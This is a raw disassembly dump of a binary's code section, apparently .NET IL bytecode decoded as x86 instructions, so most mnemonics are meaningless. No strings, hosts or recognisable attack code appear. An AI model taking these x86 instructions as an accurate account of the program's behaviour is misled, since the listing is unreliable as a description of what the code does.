  4025b7:	28 18                	sub    %bl,(%eax)
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	06                   	push   %es
  4025bc:	00 16                	add    %dl,(%esi)
  4025be:	28 1a                	sub    %bl,(%edx)
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4025c6:	06                   	push   %es
  4025c7:	21 00                	and    %eax,(%eax)
  4025c9:	00 06                	add    %al,(%esi)
  4025cb:	73 35                	jae    0x402602
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4025d2:	21 00                	and    %eax,(%eax)
  4025d4:	00 0a                	add    %cl,(%edx)
  4025d6:	20 10                	and    %dl,(%eax)
  4025d8:	27                   	daa
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025e1:	2c 00                	sub    $0x0,%al
  4025e3:	00 0a                	add    %cl,(%edx)
  4025e5:	73 21                	jae    0x402608
  4025e7:	00 00                	add    %al,(%eax)
  4025e9:	0a 20                	or     (%eax),%ah
  4025eb:	10 27                	adc    %ah,(%edi)
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025f5:	2c 00                	sub    $0x0,%al
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	73 36                	jae    0x402631
  4025fb:	00 00                	add    %al,(%eax)
  4025fd:	0a 28                	or     (%eax),%ch
  4025ff:	11 00                	adc    %eax,(%eax)
  402601:	00 06                	add    %al,(%esi)
  402603:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402606:	06                   	push   %es
  402607:	22 00                	and    (%eax),%al
  402609:	00 06                	add    %al,(%esi)
  40260b:	73 35                	jae    0x402642
  40260d:	00 00                	add    %al,(%eax)
  40260f:	0a 14 17             	or     (%edi,%edx,1),%dl
  402612:	17                   	pop    %ss
  402613:	73 36                	jae    0x40264b
  402615:	00 00                	add    %al,(%eax)
  402617:	0a 28                	or     (%eax),%ch
  402619:	16                   	push   %ss
  40261a:	00 00                	add    %al,(%eax)
  40261c:	06                   	push   %es
  40261d:	00 28                	add    %ch,(%eax)
  40261f:	08 00                	or     %al,(%eax)
  402621:	00 06                	add    %al,(%esi)
  402623:	28 0a                	sub    %cl,(%edx)
  402625:	00 00                	add    %al,(%eax)
  402627:	06                   	push   %es
  402628:	28 0e                	sub    %cl,(%esi)
  40262a:	00 00                	add    %al,(%eax)
  40262c:	06                   	push   %es
  40262d:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402633:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  40263a:	06                   	push   %es
  40263b:	73 37                	jae    0x402674
  40263d:	00 00                	add    %al,(%eax)
  40263f:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402642:	38 00                	cmp    %al,(%eax)
  402644:	00 0a                	add    %cl,(%edx)
  402646:	26 00 2b             	add    %ch,%es:(%ebx)
  402649:	0a 00                	or     (%eax),%al
  40264b:	16                   	push   %ss
  40264c:	28 13                	sub    %dl,(%ebx)
  40264e:	00 00                	add    %al,(%eax)
  402650:	06                   	push   %es
  402651:	00 de                	add    %bl,%dh
  402653:	19 00                	sbb    %eax,(%eax)
  402655:	de 16                	ficoms (%esi)
  402657:	26 00 72 01          	add    %dh,%es:0x1(%edx)
  40265b:	01 00                	add    %eax,(%eax)
  40265d:	70 28                	jo     0x402687
  40265f:	2e 00 00             	add    %al,%cs:(%eax)
  402662:	0a 00                	or     (%eax),%al
  402664:	16                   	push   %ss
  402665:	28 13                	sub    %dl,(%ebx)
  402667:	00 00                	add    %al,(%eax)
  402669:	06                   	push   %es
  40266a:	00 de                	add    %bl,%dh
  40266c:	00 2a                	add    %ch,(%edx)
  40266e:	00 00                	add    %al,(%eax)
  402670:	41                   	inc    %ecx
  402671:	4c                   	dec    %esp
  402672:	00 00                	add    %al,(%eax)
  402674:	00 00                	add    %al,(%eax)
  402676:	00 00                	add    %al,(%eax)
  402678:	d9 00                	flds   (%eax)
  40267a:	00 00                	add    %al,(%eax)
  40267c:	24 00                	and    $0x0,%al
  40267e:	00 00                	add    %al,(%eax)
  402680:	fd                   	std
  402681:	00 00                	add    %al,(%eax)
  402683:	00 05 00 00 00 0f    	add    %al,0xf000000
  402689:	00 00                	add    %al,(%eax)
  40268b:	01 02                	add    %eax,(%edx)
  40268d:	00 00                	add    %al,(%eax)
  40268f:	00 31                	add    %dh,(%ecx)
  402691:	01 00                	add    %eax,(%eax)
  402693:	00 7f 00             	add    %bh,0x0(%edi)
  402696:	00 00                	add    %al,(%eax)
  402698:	b0 01                	mov    $0x1,%al
  40269a:	00 00                	add    %al,(%eax)
  40269c:	0d 00 00 00 00       	or     $0x0,%eax
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	00 00                	add    %al,(%eax)
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	00 01                	add    %al,(%ecx)
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 06                	add    %al,(%esi)
  4026ad:	03 00                	add    (%eax),%eax
  4026af:	00 07                	add    %al,(%edi)
  4026b1:	03 00                	add    (%eax),%eax
  4026b3:	00 16                	add    %dl,(%esi)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 0f                	add    %cl,(%edi)
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	01 13                	add    %edx,(%ebx)
  4026bd:	30 02                	xor    %al,(%edx)
  4026bf:	00 0f                	add    %cl,(%edi)
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	00 02                	add    %al,(%edx)
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	11 00                	adc    %eax,(%eax)
  4026c9:	02 28                	add    (%eax),%ch
  4026cb:	39 00                	cmp    %eax,(%eax)
  4026cd:	00 0a                	add    %cl,(%edx)
  4026cf:	16                   	push   %ss
  4026d0:	fe 03                	incb   (%ebx)
  4026d2:	0a 2b                	or     (%ebx),%ch
  4026d4:	00 06                	add    %al,(%esi)
  4026d6:	2a 00                	sub    (%eax),%al
  4026d8:	13 30                	adc    (%eax),%esi
  4026da:	02 00                	add    (%eax),%al
  4026dc:	07                   	pop    %es
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 02                	add    %al,(%edx)
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	11 00                	adc    %eax,(%eax)
  4026e5:	17                   	pop    %ss
  4026e6:	0a 2b                	or     (%ebx),%ch
  4026e8:	00 06                	add    %al,(%esi)
  4026ea:	2a 00                	sub    (%eax),%al
  4026ec:	1b 30                	sbb    (%eax),%esi
  4026ee:	02 00                	add    (%eax),%al
  4026f0:	56                   	push   %esi
	...
  4026f9:	00 28                	add    %ch,(%eax)
  4026fb:	08 00                	or     %al,(%eax)
  4026fd:	00 06                	add    %al,(%esi)
  4026ff:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402704:	06                   	push   %es
  402705:	28 3a                	sub    %bh,(%edx)
  402707:	00 00                	add    %al,(%eax)
  402709:	0a 00                	or     (%eax),%al
  40270b:	28 06                	sub    %al,(%esi)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	06                   	push   %es
  402710:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402715:	06                   	push   %es
  402716:	28 3b                	sub    %bh,(%ebx)
  402718:	00 00                	add    %al,(%eax)
  40271a:	0a 00                	or     (%eax),%al
  40271c:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402722:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  402727:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40272a:	00 0a                	add    %cl,(%edx)
  40272c:	00 28                	add    %ch,(%eax)
  40272e:	10 00                	adc    %al,(%eax)
  402730:	00 06                	add    %al,(%esi)
  402732:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402737:	06                   	push   %es
  402738:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40273b:	00 0a                	add    %cl,(%edx)
  40273d:	00 00                	add    %al,(%eax)
  40273f:	de 05 26 00 00 de    	fiadds 0xde000026
  402745:	00 16                	add    %dl,(%esi)
  402747:	28 13                	sub    %dl,(%ebx)
  402749:	00 00                	add    %al,(%eax)
  40274b:	06                   	push   %es
  40274c:	00 2a                	add    %ch,(%edx)
  40274e:	00 00                	add    %al,(%eax)
  402750:	01 10                	add    %edx,(%eax)
  402752:	00 00                	add    %al,(%eax)
  402754:	00 00                	add    %al,(%eax)
  402756:	01 00                	add    %eax,(%eax)
  402758:	48                   	dec    %eax
  402759:	49                   	dec    %ecx
  40275a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402760:	1b 30                	sbb    (%eax),%esi
  402762:	06                   	push   %es
  402763:	00 20                	add    %ah,(%eax)
  402765:	02 00                	add    (%eax),%al
  402767:	00 05 00 00 11 00    	add    %al,0x110000
  40276d:	00 28                	add    %ch,(%eax)
  40276f:	06                   	push   %es
  402770:	00 00                	add    %al,(%eax)
  402772:	06                   	push   %es
  402773:	6f                   	outsl  %ds:(%esi),(%dx)
  402774:	25 00 00 0a 2c       	and    $0x2c0a0000,%eax
  402779:	0a 28                	or     (%eax),%ch
  40277b:	12 00                	adc    (%eax),%al
  40277d:	00 06                	add    %al,(%esi)
  40277f:	16                   	push   %ss
  402780:	fe 01                	incb   (%ecx)
  402782:	2b 01                	sub    (%ecx),%eax
  402784:	17                   	pop    %ss
  402785:	0b 07                	or     (%edi),%eax
  402787:	2c 0d                	sub    $0xd,%al
  402789:	00 16                	add    %dl,(%esi)
  40278b:	28 13                	sub    %dl,(%ebx)
  40278d:	00 00                	add    %al,(%eax)
  40278f:	06                   	push   %es
  402790:	00 dd                	add    %bl,%ch
  402792:	f5                   	cmc
  402793:	01 00                	add    %eax,(%eax)
  402795:	00 28                	add    %ch,(%eax)
  402797:	08 00                	or     %al,(%eax)
  402799:	00 06                	add    %al,(%esi)
  40279b:	02 6f 3d             	add    0x3d(%edi),%ch
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	0a 0a                	or     (%edx),%cl
  4027a2:	06                   	push   %es
  4027a3:	16                   	push   %ss
  4027a4:	fe 02                	incb   (%edx)
  4027a6:	0c 08                	or     $0x8,%al
  4027a8:	39 c6                	cmp    %eax,%esi
  4027aa:	01 00                	add    %eax,(%eax)
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	28 0e                	sub    %cl,(%esi)
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	06                   	push   %es
  4027b4:	6a 58                	push   $0x58
  4027b6:	28 0f                	sub    %cl,(%edi)
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	06                   	push   %es
  4027bb:	00 28                	add    %ch,(%eax)
  4027bd:	0c 00                	or     $0x0,%al
  4027bf:	00 06                	add    %al,(%esi)
  4027c1:	06                   	push   %es
  4027c2:	6a 59                	push   $0x59
  4027c4:	28 0d 00 00 06 00    	sub    %cl,0x60000
  4027ca:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4027cd:	00 06                	add    %al,(%esi)
  4027cf:	16                   	push   %ss
  4027d0:	6a fe                	push   $0xfffffffe
  4027d2:	01 0d 09 39 54 01    	add    %ecx,0x1543909
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	00 28                	add    %ch,(%eax)
  4027dc:	0a 00                	or     (%eax),%al
  4027de:	00 06                	add    %al,(%esi)
  4027e0:	16                   	push   %ss
  4027e1:	28 3e                	sub    %bh,(%esi)
  4027e3:	00 00                	add    %al,(%eax)
  4027e5:	0a 6a 28             	or     0x28(%edx),%ch
  4027e8:	0d 00 00 06 00       	or     $0x60000,%eax
  4027ed:	72 1d                	jb     0x40280c
  4027ef:	01 00                	add    %eax,(%eax)
  4027f1:	70 28                	jo     0x40281b
  4027f3:	0c 00                	or     $0x0,%al
  4027f5:	00 06                	add    %al,(%esi)
  4027f7:	13 04 12             	adc    (%edx,%edx,1),%eax
  4027fa:	04 28                	add    $0x28,%al
  4027fc:	3f                   	aas
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	0a 72 4b             	or     0x4b(%edx),%dh
  402802:	01 00                	add    %eax,(%eax)
  402804:	70 28                	jo     0x40282e
  402806:	40                   	inc    %eax
  402807:	00 00                	add    %al,(%eax)
  402809:	0a 28                	or     (%eax),%ch
  40280b:	2e 00 00             	add    %al,%cs:(%eax)
  40280e:	0a 00                	or     (%eax),%al
  402810:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402813:	00 06                	add    %al,(%esi)
  402815:	16                   	push   %ss
  402816:	6a fe                	push   $0xfffffffe
  402818:	02 13                	add    (%ebx),%dl
  40281a:	05 11 05 39 e6       	add    $0xe6390511,%eax
  40281f:	00 00                	add    %al,(%eax)
  402821:	00 00                	add    %al,(%eax)
  402823:	16                   	push   %ss
  402824:	6a 28                	push   $0x28
  402826:	0f 00 00             	sldt   (%eax)
  402829:	06                   	push   %es
  40282a:	00 28                	add    %ch,(%eax)
  40282c:	0c 00                	or     $0x0,%al
  40282e:	00 06                	add    %al,(%esi)
  402830:	d4 8d                	aam    $0x8d
  402832:	59                   	pop    %ecx
  402833:	00 00                	add    %al,(%eax)
  402835:	01 28                	add    %ebp,(%eax)
  402837:	0b 00                	or     (%eax),%eax
  402839:	00 06                	add    %al,(%esi)
  40283b:	00 2b                	add    %ch,(%ebx)
  40283d:	74 00                	je     0x40283f
  40283f:	28 08                	sub    %cl,(%eax)
  402841:	00 00                	add    %al,(%eax)
  402843:	06                   	push   %es
  402844:	28 0a                	sub    %cl,(%edx)
  402846:	00 00                	add    %al,(%eax)
  402848:	06                   	push   %es
  402849:	28 0e                	sub    %cl,(%esi)
  40284b:	00 00                	add    %al,(%eax)
  40284d:	06                   	push   %es
  40284e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402854:	69 6f 41 00 00 0a 13 	imul   $0x130a0000,0x41(%edi),%ebp
  40285b:	07                   	pop    %es
  40285c:	11 07                	adc    %eax,(%edi)
  40285e:	16                   	push   %ss
  40285f:	fe 02                	incb   (%edx)
  402861:	16                   	push   %ss
  402862:	fe 01                	incb   (%ecx)
  402864:	13 08                	adc    (%eax),%ecx
  402866:	11 08                	adc    %ecx,(%eax)
  402868:	2c 0d                	sub    $0xd,%al
  40286a:	00 16                	add    %dl,(%esi)
  40286c:	28 13                	sub    %dl,(%ebx)
  40286e:	00 00                	add    %al,(%eax)
  402870:	06                   	push   %es
  402871:	00 dd                	add    %bl,%ch
  402873:	14 01                	adc    $0x1,%al
  402875:	00 00                	add    %al,(%eax)
  402877:	28 0e                	sub    %cl,(%esi)
  402879:	00 00                	add    %al,(%eax)
  40287b:	06                   	push   %es
  40287c:	11 07                	adc    %eax,(%edi)
  40287e:	6a 58                	push   $0x58
  402880:	28 0f                	sub    %cl,(%edi)
  402882:	00 00                	add    %al,(%eax)
  402884:	06                   	push   %es
  402885:	00 28                	add    %ch,(%eax)
  402887:	0c 00                	or     $0x0,%al
  402889:	00 06                	add    %al,(%esi)
  40288b:	11 07                	adc    %eax,(%edi)
  40288d:	6a 59                	push   $0x59
  40288f:	28 0d 00 00 06 00    	sub    %cl,0x60000
  402895:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402898:	00 06                	add    %al,(%esi)
  40289a:	16                   	push   %ss
  40289b:	6a fe                	push   $0xfffffffe
  40289d:	04 13                	add    $0x13,%al
  40289f:	09 11                	or     %edx,(%ecx)
  4028a1:	09 2c 0d 00 16 28 13 	or     %ebp,0x13281600(,%ecx,1)
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	06                   	push   %es
  4028ab:	00 dd                	add    %bl,%ch
  4028ad:	da 00                	fiaddl (%eax)
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	00 28                	add    %ch,(%eax)
  4028b3:	0c 00                	or     $0x0,%al
  4028b5:	00 06                	add    %al,(%esi)
  4028b7:	16                   	push   %ss
  4028b8:	6a fe                	push   $0xfffffffe
  4028ba:	02 13                	add    (%ebx),%dl
  4028bc:	0a 11                	or     (%ecx),%dl
  4028be:	0a 3a                	or     (%edx),%bh
  4028c0:	7a ff                	jp     0x4028c1
  4028c2:	ff                   	(bad)
  4028c3:	ff 14 fe             	call   *(%esi,%edi,8)
  4028c6:	06                   	push   %es
  4028c7:	46                   	inc    %esi
  4028c8:	00 00                	add    %al,(%eax)
  4028ca:	06                   	push   %es
  4028cb:	73 42                	jae    0x40290f
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	0a 73 43             	or     0x43(%ebx),%dh
  4028d2:	00 00                	add    %al,(%eax)
  4028d4:	0a 13                	or     (%ebx),%dl
  4028d6:	06                   	push   %es
  4028d7:	11 06                	adc    %eax,(%esi)
  4028d9:	28 0a                	sub    %cl,(%edx)
  4028db:	00 00                	add    %al,(%eax)
  4028dd:	06                   	push   %es
  4028de:	6f                   	outsl  %ds:(%esi),(%dx)
  4028df:	44                   	inc    %esp
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	0a 00                	or     (%eax),%al
  4028e4:	16                   	push   %ss
  4028e5:	6a 28                	push   $0x28
  4028e7:	0f 00 00             	sldt   (%eax)
  4028ea:	06                   	push   %es
  4028eb:	00 1a                	add    %bl,(%edx)
  4028ed:	6a 28                	push   $0x28
  4028ef:	0d 00 00 06 00       	or     $0x60000,%eax
  4028f4:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4028f7:	00 06                	add    %al,(%esi)
  4028f9:	d4 8d                	aam    $0x8d
  4028fb:	59                   	pop    %ecx
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	01 28                	add    %ebp,(%eax)
  402900:	0b 00                	or     (%eax),%eax
  402902:	00 06                	add    %al,(%esi)
  402904:	00 00                	add    %al,(%eax)
  402906:	2b 23                	sub    (%ebx),%esp
  402908:	00 1a                	add    %bl,(%edx)
  40290a:	6a 28                	push   $0x28
  40290c:	0d 00 00 06 00       	or     $0x60000,%eax
  402911:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402914:	00 06                	add    %al,(%esi)
  402916:	d4 8d                	aam    $0x8d
  402918:	59                   	pop    %ecx
  402919:	00 00                	add    %al,(%eax)
  40291b:	01 28                	add    %ebp,(%eax)
  40291d:	0b 00                	or     (%eax),%eax
  40291f:	00 06                	add    %al,(%esi)
  402921:	00 16                	add    %dl,(%esi)
  402923:	6a 28                	push   $0x28
  402925:	0f 00 00             	sldt   (%eax)
  402928:	06                   	push   %es
  402929:	00 00                	add    %al,(%eax)
  40292b:	00 2b                	add    %ch,(%ebx)
  40292d:	19 28                	sbb    %ebp,(%eax)
  40292f:	0c 00                	or     $0x0,%al
  402931:	00 06                	add    %al,(%esi)
  402933:	16                   	push   %ss
  402934:	6a fe                	push   $0xfffffffe
  402936:	04 13                	add    $0x13,%al
  402938:	0b 11                	or     (%ecx),%edx
  40293a:	0b 2c 0a             	or     (%edx,%ecx,1),%ebp
  40293d:	00 16                	add    %dl,(%esi)
  40293f:	28 13                	sub    %dl,(%ebx)
  402941:	00 00                	add    %al,(%eax)
  402943:	06                   	push   %es
  402944:	00 de                	add    %bl,%dh
  402946:	44                   	inc    %esp
  402947:	28 08                	sub    %cl,(%eax)
  402949:	00 00                	add    %al,(%eax)
  40294b:	06                   	push   %es
  40294c:	28 0a                	sub    %cl,(%edx)
  40294e:	00 00                	add    %al,(%eax)
  402950:	06                   	push   %es
  402951:	28 0e                	sub    %cl,(%esi)
  402953:	00 00                	add    %al,(%eax)
  402955:	06                   	push   %es
  402956:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40295c:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402963:	06                   	push   %es
  402964:	73 37                	jae    0x40299d
  402966:	00 00                	add    %al,(%eax)
  402968:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40296b:	38 00                	cmp    %al,(%eax)
  40296d:	00 0a                	add    %cl,(%edx)
  40296f:	26 00 2b             	add    %ch,%es:(%ebx)
  402972:	0a 00                	or     (%eax),%al
  402974:	16                   	push   %ss
  402975:	28 13                	sub    %dl,(%ebx)
  402977:	00 00                	add    %al,(%eax)
  402979:	06                   	push   %es
  40297a:	00 de                	add    %bl,%dh
  40297c:	0e                   	push   %cs
  40297d:	00 de                	add    %bl,%dh
  40297f:	0b 26                	or     (%esi),%esp
  402981:	00 16                	add    %dl,(%esi)
  402983:	28 13                	sub    %dl,(%ebx)
  402985:	00 00                	add    %al,(%eax)
  402987:	06                   	push   %es
  402988:	00 de                	add    %bl,%dh
  40298a:	00 2a                	add    %ch,(%edx)
  40298c:	41                   	inc    %ecx
  40298d:	1c 00                	sbb    $0x0,%al
  40298f:	00 00                	add    %al,(%eax)
  402991:	00 00                	add    %al,(%eax)
  402993:	00 01                	add    %al,(%ecx)
  402995:	00 00                	add    %al,(%eax)
  402997:	00 13                	add    %dl,(%ebx)
  402999:	02 00                	add    (%eax),%al
  40299b:	00 14 02             	add    %dl,(%edx,%eax,1)
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	0b 00                	or     (%eax),%eax
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	0f 00 00             	sldt   (%eax)
  4029a7:	01 1b                	add    %ebx,(%ebx)
  4029a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4029ac:	2d 01 00 00 06       	sub    $0x6000001,%eax
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	11 00                	adc    %eax,(%eax)
  4029b5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4029b8:	00 06                	add    %al,(%esi)
  4029ba:	0a 16                	or     (%esi),%dl
  4029bc:	0b 06                	or     (%esi),%eax
  4029be:	12 01                	adc    (%ecx),%al
  4029c0:	28 45 00             	sub    %al,0x0(%ebp)
  4029c3:	00 0a                	add    %cl,(%edx)
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	00 28                	add    %ch,(%eax)
  4029c9:	12 00                	adc    (%eax),%al
  4029cb:	00 06                	add    %al,(%esi)
  4029cd:	16                   	push   %ss
  4029ce:	fe 01                	incb   (%ecx)
  4029d0:	0d 09 2c 06 00       	or     $0x62c09,%eax
  4029d5:	dd 06                	fldl   (%esi)
  4029d7:	01 00                	add    %eax,(%eax)
  4029d9:	00 02                	add    %al,(%edx)
  4029db:	8e 69 28             	mov    0x28(%ecx),%gs
  4029de:	46                   	inc    %esi
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4029e4:	06                   	push   %es
  4029e5:	00 00                	add    %al,(%eax)
  4029e7:	06                   	push   %es
  4029e8:	15 17 6f 47 00       	adc    $0x476f17,%eax
  4029ed:	00 0a                	add    %cl,(%edx)
  4029ef:	26 28 08             	sub    %cl,%es:(%eax)
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	06                   	push   %es
  4029f5:	08 16                	or     %dl,(%esi)
  4029f7:	08 8e 69 6f 48 00    	or     %cl,0x486f69(%esi)
  4029fd:	00 0a                	add    %cl,(%edx)
  4029ff:	00 02                	add    %al,(%edx)
  402a01:	8e 69 20             	mov    0x20(%ecx),%gs
  402a04:	40                   	inc    %eax
  402a05:	42                   	inc    %edx
  402a06:	0f 00                	(bad)
  402a08:	fe 02                	incb   (%edx)
  402a0a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a0d:	04 39                	add    $0x39,%al
  402a0f:	87 00                	xchg   %eax,(%eax)
  402a11:	00 00                	add    %al,(%eax)
  402a13:	00 72 63             	add    %dh,0x63(%edx)
  402a16:	01 00                	add    %eax,(%eax)
  402a18:	70 28                	jo     0x402a42
  402a1a:	2e 00 00             	add    %al,%cs:(%eax)
  402a1d:	0a 00                	or     (%eax),%al
  402a1f:	02 73 49             	add    0x49(%ebx),%dh
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a 13                	or     (%ebx),%dl
  402a26:	05 00 16 13 06       	add    $0x6131600,%eax
  402a2b:	11 05 16 6a 6f 4a    	adc    %eax,0x4a6f6a16
  402a31:	00 00                	add    %al,(%eax)
  402a33:	0a 00                	or     (%eax),%al
  402a35:	20 50 c3             	and    %dl,-0x3d(%eax)
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	8d 59 00             	lea    0x0(%ecx),%ebx
  402a3d:	00 01                	add    %al,(%ecx)
  402a3f:	13 07                	adc    (%edi),%eax
  402a41:	2b 2a                	sub    (%edx),%ebp
  402a43:	00 28                	add    %ch,(%eax)
  402a45:	06                   	push   %es
  402a46:	00 00                	add    %al,(%eax)
  402a48:	06                   	push   %es
  402a49:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a4e:	00 0a                	add    %cl,(%edx)
  402a50:	26 28 08             	sub    %cl,%es:(%eax)
  402a53:	00 00                	add    %al,(%eax)
  402a55:	06                   	push   %es
  402a56:	11 07                	adc    %eax,(%edi)
  402a58:	16                   	push   %ss
  402a59:	11 06                	adc    %eax,(%esi)
  402a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5c:	48                   	dec    %eax
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	0a 00                	or     (%eax),%al
  402a61:	28 08                	sub    %cl,(%eax)
  402a63:	00 00                	add    %al,(%eax)
  402a65:	06                   	push   %es
  402a66:	6f                   	outsl  %ds:(%esi),(%dx)
  402a67:	4b                   	dec    %ebx
  402a68:	00 00                	add    %al,(%eax)
  402a6a:	0a 00                	or     (%eax),%al
  402a6c:	00 11                	add    %dl,(%ecx)
  402a6e:	05 11 07 16 11       	add    $0x11160711,%eax
  402a73:	07                   	pop    %es
  402a74:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402a77:	41                   	inc    %ecx
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	0a 25 13 06 16 fe    	or     0xfe160613,%ah
  402a80:	02 13                	add    (%ebx),%dl
  402a82:	08 11                	or     %dl,(%ecx)
  402a84:	08 2d bc 00 de 0d    	or     %ch,0xdde00bc
  402a8a:	11 05 2c 08 11 05    	adc    %eax,0x511082c
  402a90:	6f                   	outsl  %ds:(%esi),(%dx)
  402a91:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402a96:	dc 00                	faddl  (%eax)
  402a98:	2b 2a                	sub    (%edx),%ebp
  402a9a:	00 28                	add    %ch,(%eax)
  402a9c:	06                   	push   %es
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	06                   	push   %es
  402aa0:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402aa5:	00 0a                	add    %cl,(%edx)
  402aa7:	26 28 08             	sub    %cl,%es:(%eax)
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	06                   	push   %es
  402aad:	02 16                	add    (%esi),%dl
  402aaf:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402ab5:	00 0a                	add    %cl,(%edx)
  402ab7:	00 28                	add    %ch,(%eax)
  402ab9:	08 00                	or     %al,(%eax)
  402abb:	00 06                	add    %al,(%esi)
  402abd:	6f                   	outsl  %ds:(%esi),(%dx)
  402abe:	4b                   	dec    %ebx
  402abf:	00 00                	add    %al,(%eax)
  402ac1:	0a 00                	or     (%eax),%al
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	de 0b                	fimuls (%ebx)
  402ac7:	26 00 16             	add    %dl,%es:(%esi)
  402aca:	28 13                	sub    %dl,(%ebx)
  402acc:	00 00                	add    %al,(%eax)
  402ace:	06                   	push   %es
  402acf:	00 de                	add    %bl,%dh
  402ad1:	0e                   	push   %cs
  402ad2:	00 de                	add    %bl,%dh
  402ad4:	0b 07                	or     (%edi),%eax
  402ad6:	2c 07                	sub    $0x7,%al
  402ad8:	06                   	push   %es
  402ad9:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402add:	0a 00                	or     (%eax),%al
  402adf:	dc 2a                	fsubrl (%edx)
  402ae1:	00 00                	add    %al,(%eax)
  402ae3:	00 41 4c             	add    %al,0x4c(%ecx)
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	02 00                	add    (%eax),%al
  402aea:	00 00                	add    %al,(%eax)
  402aec:	73 00                	jae    0x402aee
  402aee:	00 00                	add    %al,(%eax)
  402af0:	63 00                	arpl   %eax,(%eax)
  402af2:	00 00                	add    %al,(%eax)
  402af4:	d6                   	salc
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 0d 00 00 00 00    	add    %cl,0x0
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 00                	add    %al,(%eax)
  402b01:	00 00                	add    %al,(%eax)
  402b03:	00 13                	add    %dl,(%ebx)
  402b05:	00 00                	add    %al,(%eax)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	01 00                	add    %eax,(%eax)
  402b0b:	00 13                	add    %dl,(%ebx)
  402b0d:	01 00                	add    %eax,(%eax)
  402b0f:	00 0b                	add    %cl,(%ebx)
  402b11:	00 00                	add    %al,(%eax)
  402b13:	00 0f                	add    %cl,(%edi)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	01 02                	add    %eax,(%edx)
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	00 09                	add    %cl,(%ecx)
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	00 18                	add    %bl,(%eax)
  402b21:	01 00                	add    %eax,(%eax)
  402b23:	00 21                	add    %ah,(%ecx)
  402b25:	01 00                	add    %eax,(%eax)
  402b27:	00 0b                	add    %cl,(%ebx)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 00                	add    %al,(%eax)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	00 1b                	add    %bl,(%ebx)
